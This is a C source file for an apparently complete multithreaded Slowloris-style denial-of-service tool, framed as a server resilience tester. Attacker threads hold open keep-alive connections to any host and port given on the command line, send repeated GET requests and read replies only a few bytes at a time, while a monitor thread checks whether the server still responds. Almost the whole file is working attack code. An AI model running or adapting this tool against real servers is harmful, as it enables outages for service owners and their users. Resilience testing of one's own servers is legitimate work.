/*
Copyright 2019, Boaz Segev
License: ISC

License limitations: May only be used for security testing and with permission
of target device.
*/

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

/* I can't seem to remember which onse I actually use... */
#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include <poll.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>

#include <arpa/inet.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

#define ASSERT_COND(cond, ...)                                                 \
  do {                                                                         \
    if (!(cond)) {                                                             \
      fprintf(stderr, __VA_ARGS__);                                            \
      perror("\n\terrno");                                                     \
      exit(-1);                                                                \
    }                                                                          \
  } while (0)

/* *****************************************************************************
Global State and Settings
***************************************************************************** */

#define RESULT_FAILED 2
#define RESULT_UNKNOWN 1
#define RESULT_PASSED 0

#define TEST_TIME 20 /* test time in seconds 0 == inifinity */
#define USE_PIPELINING 1
#define PRINT_PAGE_OF_DATA 1
#define MTU_LIMIT (524)

static size_t ATTACKERS = 24;
static volatile uint8_t flag = 1;
static const char *address;
static const char *port;

static size_t total_requests;
static size_t total_reads;
static size_t total_eof;
static size_t total_disconnections;
static size_t total_attempts;
static size_t total_failures;
static size_t total_success;
static size_t max_wait;

static const char HTTP_REQUEST_HEAD[] =
    "GET / HTTP/1.1\r\nConnection: keep-alive\r\nHost: ";
static char MSG_OUTPUT[1024]; /* pipelined requests in MTU */
static size_t MSG_LEN;
static size_t REQ_PER_MSG;

/* copies an HTTP request to the internal buffer */
static void prep_msg(void) {
  ASSERT_COND(strlen(address) < 512, "host name too long");
  if (USE_PIPELINING) {
    MSG_LEN = strlen(HTTP_REQUEST_HEAD) + strlen(address) + 4;
    REQ_PER_MSG = 1;
    memcpy(MSG_OUTPUT, HTTP_REQUEST_HEAD, strlen(HTTP_REQUEST_HEAD));
    memcpy(MSG_OUTPUT + strlen(HTTP_REQUEST_HEAD), address, strlen(address));
    MSG_OUTPUT[MSG_LEN - 4] = '\r';
    MSG_OUTPUT[MSG_LEN - 3] = '\n';
    MSG_OUTPUT[MSG_LEN - 2] = '\r';
    MSG_OUTPUT[MSG_LEN - 1] = '\n';
  } else {
    memcpy(MSG_OUTPUT, HTTP_REQUEST_HEAD, strlen(HTTP_REQUEST_HEAD));
    memcpy(MSG_OUTPUT + strlen(HTTP_REQUEST_HEAD), address, strlen(address));
    MSG_LEN = strlen(HTTP_REQUEST_HEAD) + strlen(address) + 4;
    REQ_PER_MSG = MTU_LIMIT / MSG_LEN;
    MSG_OUTPUT[MSG_LEN - 4] = '\r';
    MSG_OUTPUT[MSG_LEN - 3] = '\n';
    MSG_OUTPUT[MSG_LEN - 2] = '\r';
    MSG_OUTPUT[MSG_LEN - 1] = '\n';
    if (!REQ_PER_MSG)
      REQ_PER_MSG = 1;
    for (size_t i = 1; i < REQ_PER_MSG; ++i) {
      memcpy(MSG_OUTPUT + (i * MSG_LEN), MSG_OUTPUT, MSG_LEN);
    }
    MSG_LEN *= REQ_PER_MSG;
  }
}

/* handles the SIGUSR1, SIGINT and SIGTERM signals. */
static void sig_int_handler(int sig) {
  signal(SIGINT, SIG_DFL);
  switch (sig) {
  case SIGINT:  /* fallthrough */
  case SIGTERM: /* fallthrough */
    flag = 0;
    break;
  default:
    break;
  }
}

/* *****************************************************************************
Tester functions
***************************************************************************** */

/* error reporting for server test */
typedef enum {
  SERVER_OK,
  OPENFILE_LIMIT,
  CONNECTION_FAILED,
  REQUEST_FAILED,
  RESPONSE_TIMEOUT,
} test_err_en;

/** Opens a connection and sends a single HTTP request. */
static test_err_en test_server(size_t timeout);

/* a single attack connection */
static void attack_server(void);

/* a single attacker thread */
static void *attack_server_task(void *ignr_);

/* a single tester thread */
static void *test_server_task(void *ignr_);

/* *****************************************************************************
Main attack function
***************************************************************************** */

int main(int argc, char const *argv[]) {
  int result = 0;
  ASSERT_COND(argc == 3 || argc == 4,
              "\nTo test HTTP/1.1 server against Slowloris, "
              "use: %s addr port [attackers]\ni.e.:\n\t\t%s example.com 80"
              "\n\t\t%s localhost 3000 24",
              argv[0], argv[0], argv[0]);
  /* initialize stuff */
  signal(SIGPIPE, SIG_IGN);
  signal(SIGINT, sig_int_handler);
  signal(SIGTERM, sig_int_handler);

  if (argc == 4 && atol(argv[3]) > 0)
    ATTACKERS = atol(argv[3]);

  address = argv[1];
  port = argv[2];
  prep_msg();

  switch (test_server(5)) {
  case SERVER_OK:
    fprintf(stderr, "* PASSED sanity test.\n");
    break;
  case OPENFILE_LIMIT:
    ASSERT_COND(0, "FAILED to connect to %s:%s - no open files available?",
                address, port);
    break;
  case CONNECTION_FAILED:
    ASSERT_COND(0, "FAILED to connect to %s:%s", address, port);
    break;
  case REQUEST_FAILED:
    ASSERT_COND(0, "FAILED to send request to %s:%s", address, port);
    break;
  case RESPONSE_TIMEOUT:
    ASSERT_COND(0, "FAILED, response timed out for %s:%s", address, port);
    break;
  }

  fprintf(stderr, "* Starting %zu attack loops, with %zu bytes per request.\n",
          ATTACKERS, MSG_LEN / REQ_PER_MSG);
  size_t thread_count = 0;
  pthread_t *threads = calloc(sizeof(*threads), ATTACKERS + 1);
  ASSERT_COND(threads, "couldn't allocate memoryt for thread data store");

  time_t start = 0;
  time(&start);
  for (size_t i = 0; i < ATTACKERS; ++i) {
    if (pthread_create(threads + thread_count, NULL, attack_server_task,
                       NULL) == 0)
      ++thread_count;
  }
  if (pthread_create(threads + thread_count, NULL, test_server_task, NULL) == 0)
    ++thread_count;
  if (!thread_count) {
    attack_server();
    test_server_task(NULL);
  } else if (TEST_TIME) {
    for (int i = 0; i < TEST_TIME && flag; ++i) {
      const struct timespec tm = {.tv_sec = 1};
      nanosleep(&tm, NULL);
    }
    flag = 0;
    fprintf(stderr, "* Stopping test...\n");
  }
  while (thread_count) {
    --thread_count;
    pthread_join(threads[thread_count], NULL);
  }
  time_t end = 0;
  time(&end);

  fprintf(stderr,
          "Stats:\n"
          "\tTest length: %zu seconds\n"
          "\tConcurrent attackers: %zu\n"
          "\tRequests sent: %zu\n"
          "\tBytes sent: %zu\n"
          "\tBytes received: %zu\n"
          "\tSucceful requests: %zu / %zu\n"
          "\tDisconnections: %zu\n"
          "\tEOF on attempted read: %zu\n"
          "\tSlowest test cycle: %zu\n",
          end - start, ATTACKERS, total_requests,
          (total_requests * (MSG_LEN / REQ_PER_MSG)), total_reads,
          total_success, total_attempts, total_disconnections, total_eof,
          max_wait);

  if (max_wait > 5 || total_attempts != total_success) {
    result = RESULT_FAILED;
    fprintf(stderr, "FAILED! the server experienced DoS at least once or "
                    "took more than 10 seconds to respond.\n");
  } else if ((max_wait > 1 ||
              ((total_disconnections / 2) / (end - start) == 0)) &&
             !total_eof) {
    result = RESULT_UNKNOWN;
    fprintf(stderr, "Unknown. Server may have been partially effected.\n");
  } else {
    result = RESULT_PASSED;
    fprintf(stderr, "PASSED.\n");
  }
  return result;
}

/* *****************************************************************************
Aomic operation helpers
***************************************************************************** */

/* C11 Atomics are defined? */
#if defined(__ATOMIC_RELAXED)
/** An atomic addition operation */
#define atomic_add(p_obj, value)                                               \
  __atomic_add_fetch((p_obj), (value), __ATOMIC_SEQ_CST)
/** An atomic subtraction operation */
/* Select the correct compiler builtin method. */
#elif __has_builtin(__sync_add_and_fetch)
#define atomic_add(p_obj, value) __sync_add_and_fetch((p_obj), (value))
#elif __GNUC__ > 3
/** An atomic addition operation */
#define atomic_add(p_obj, value) __sync_add_and_fetch((p_obj), (value))
#else
#error Required builtin "__sync_add_and_fetch" not found.
#endif

/* *****************************************************************************
IO Helpers
***************************************************************************** */

static int set_non_block(int fd) {
/* If they have O_NONBLOCK, use the Posix way to do it */
#if defined(O_NONBLOCK)
  /* Fixme: O_NONBLOCK is defined but broken on SunOS 4.1.x and AIX 3.2.5. */
  int flags;
  if (-1 == (flags = fcntl(fd, F_GETFL, 0)))
    flags = 0;
  // printf("flags initial value was %d\n", flags);
  return fcntl(fd, F_SETFL, flags | O_NONBLOCK | O_CLOEXEC);
#elif defined(FIONBIO)
  /* Otherwise, use the old way of doing it */
  static int flags = 1;
  return ioctl(fd, FIONBIO, &flags);
#else
#error No functions / argumnet macros for non-blocking sockets.
#endif
}

/** Opens a TCP/IP connection using a blocking IO socket */
static int __attribute__((unused)) connect2tcp(const char *a, const char *p) {
  /* TCP/IP socket */
  struct addrinfo hints = {0};
  struct addrinfo *addrinfo;       // will point to the results
  memset(&hints, 0, sizeof hints); // make sure the struct is empty
  hints.ai_family = AF_UNSPEC;     // don't care IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM; // TCP stream sockets
  hints.ai_flags = AI_PASSIVE;     // fill in my IP for me
  if (getaddrinfo(a, p, &hints, &addrinfo)) {
    // perror("addr err");
    return -1;
  }
  // get the file descriptor
  int fd =
      socket(addrinfo->ai_family, addrinfo->ai_socktype, addrinfo->ai_protocol);
  if (fd == -1 || set_non_block(fd) < 0) {
    freeaddrinfo(addrinfo);
    return -1;
  }

  int one = 1;
  setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
  errno = 0;
  for (struct addrinfo *i = addrinfo; i; i = i->ai_next) {
    if (connect(fd, i->ai_addr, i->ai_addrlen) == 0 || errno == EINPROGRESS)
      goto socket_okay;
    perror("Connect failed...");
  }
  freeaddrinfo(addrinfo);
  close(fd);
  return -1;
socket_okay:
  freeaddrinfo(addrinfo);
  return fd;
}

/* *****************************************************************************
Polling Helpers
***************************************************************************** */

/** Waits for socket to become available for either reading or writing */
static inline int wait__internal(int fd, uint16_t events) {
  errno = 0;
  int i = 0;
  if (fd == -1)
    goto badfd;
  struct pollfd ls = {.fd = fd, .events = events};
  i = poll(&ls, 1, 1000);
  if (i > 0) {
    if ((ls.revents & POLLHUP) || (ls.revents & POLLERR) ||
        (ls.revents & POLLNVAL))
      goto badfd;
    return 0;
  }
  switch (errno) {
  case EFAULT: /* overflow */
  case EINVAL: /* overflow */
  case ENOMEM: /* overflow */
    return -1;
  }
  errno = EWOULDBLOCK;
  return -1;
badfd:
  errno = EBADF;
  return -1;
}

/** Waits for socket to become available for either reading or writing */
static __attribute__((unused)) int wait4fd(int fd) {
  return wait__internal(fd, POLLIN | POLLOUT);
}
/** Waits for socket to become available for reading */
static __attribute__((unused)) int wait4read(int fd) {
  return wait__internal(fd, POLLIN);
}
/** Waits for socket to become available for reading */
static __attribute__((unused)) int wait4write(int fd) {
  return wait__internal(fd, POLLOUT);
}

/* *****************************************************************************
Test
***************************************************************************** */

static test_err_en test_server(size_t timeout) {
  int fd = connect2tcp(address, port);

  if (fd == -1) {
    if (errno == EMFILE || errno == ENFILE || errno == ENOMEM)
      return OPENFILE_LIMIT;
    return CONNECTION_FAILED;
  }

  time_t start = 0;
  time(&start);

  size_t blocks = 0;
  while (wait4write(fd) < 0) {
    if (errno != EWOULDBLOCK || ++blocks >= timeout || !flag) {
      /* timeout / error / stop */
      close(fd);
      if (!flag)
        return SERVER_OK;
      return CONNECTION_FAILED;
    }
  }

  // fprintf(stderr, "* TEST: connected to %s:%s\n", address, port);
  if (write(fd, MSG_OUTPUT, MSG_LEN / REQ_PER_MSG) !=
      (ssize_t)(MSG_LEN / REQ_PER_MSG)) {
    /* a new connection and the buffer is full? no... */
    close(fd);
    // fprintf(stderr, "* TEST: couldn't send rerquest to %s:%s\n", address,
    // port);
    return REQUEST_FAILED;
  }

  blocks = 0;
  while (wait4read(fd) < 0) {
    if (errno != EWOULDBLOCK || ++blocks >= timeout || !flag) {
      /* timeout / error */
      close(fd);
      if (!flag)
        return SERVER_OK;
      return RESPONSE_TIMEOUT;
    }
  }

  char buffer[4096];
  if (read(fd, buffer, 1024) < 12) {
    close(fd);
    return RESPONSE_TIMEOUT;
  }
  close(fd);
  // fprintf(stderr, "* TEST: received response from %s:%s\n", address, port);
  time_t end = 0;
  time(&end);
  if (max_wait < (size_t)(end - start)) {
    /* non-atomic... but who cares. */
    max_wait = end - start;
  }
  return SERVER_OK;
}

/* *****************************************************************************
Attack
***************************************************************************** */

static void attack_server(void) {
  int fd = connect2tcp(address, port);
  size_t offset = 0;
  uint8_t read_once = 0;
  while (flag) {
    if (wait4write(fd) == 0) {
      ssize_t w = write(fd, MSG_OUTPUT + offset, MSG_LEN - offset);
      if (w < 0) {
        /* error... waiting? */
        if (errno != EWOULDBLOCK && errno != EAGAIN && errno != EINTR) {
          break;
        }
      } else {
        offset += w;
        if (offset >= MSG_LEN) {
          offset = 0;
          atomic_add(&total_requests, REQ_PER_MSG);
        }
      }

    } else if (errno != EWOULDBLOCK && errno != EAGAIN) {
      break;
    }
    if (wait4read(fd) == 0) {
      size_t buf;
      ssize_t r = read(fd, &buf, sizeof(buf));
      if (r < 0)
        break; /* read a few bytes at a time */
      if (!r) {
        atomic_add(&total_eof, 1);
      } else {
        atomic_add(&total_reads, r);
        read_once = 1;
      }
    } else if (errno == EWOULDBLOCK || errno == EAGAIN) {
      if (read_once) {
        atomic_add(&total_eof, 1);
        break;
      }
    } else {
      if (read_once)
        break;
    }
  }
  if (flag)
    atomic_add(&total_disconnections, 1);
  close(fd);
  return;
}

/* *****************************************************************************
Multi-Threaded Testing / Attacking
***************************************************************************** */

/* a single attacker thread */
static void *attack_server_task(void *ignr_) {
  while (flag)
    attack_server();
  return NULL;
  (void)ignr_;
}

/* a single tester thread */
static void *test_server_task(void *ignr_) {
  while (flag) {
    const struct timespec tm = {.tv_sec = 1};
    nanosleep(&tm, NULL);
    if (!flag)
      break;
    atomic_add(&total_attempts, 1);
    switch (test_server(15)) {
    case SERVER_OK:
      if (flag)
        fprintf(stderr, "* Server online.\n");
      atomic_add(&total_success, 1);
      break;
    case OPENFILE_LIMIT:
      fprintf(stderr, "* No available sockets.\n");
      atomic_add(&total_success, 1);
      break;
    case CONNECTION_FAILED: /* overflow*/
    case REQUEST_FAILED:    /* overflow*/
    case RESPONSE_TIMEOUT:
      atomic_add(&total_failures, 1);
      fprintf(stderr, "* Failure detected.\n");
      break;
    }
  }
  return NULL;
  (void)ignr_;
}
